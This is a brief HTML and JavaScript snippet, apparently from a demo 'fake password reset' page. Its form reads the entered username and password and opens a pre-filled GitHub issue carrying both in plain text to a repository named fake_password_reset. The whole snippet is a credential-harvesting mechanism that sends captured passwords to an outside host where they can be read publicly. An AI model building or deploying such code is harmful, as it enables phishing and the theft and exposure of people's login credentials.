<form id="passwordForm">
  <!-- Your form fields -->
  <button type="button" onclick="logToGitHub()">Submit</button>
</form>

<script>
function logToGitHub() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Format data for GitHub Issue
  const issueTitle = `[Demo] Submission from ${username}`;
  const issueBody = `Username: ${username}\nPassword: ${password}`;

  // Open pre-filled GitHub Issue (user must be logged into GitHub)
  window.open(
    `https://github.com/Isa101/fake_password_reset/issues/new?title=${encodeURIComponent(issueTitle)}&body=${encodeURIComponent(issueBody)}`,
    "_blank"
  );
}
</script>
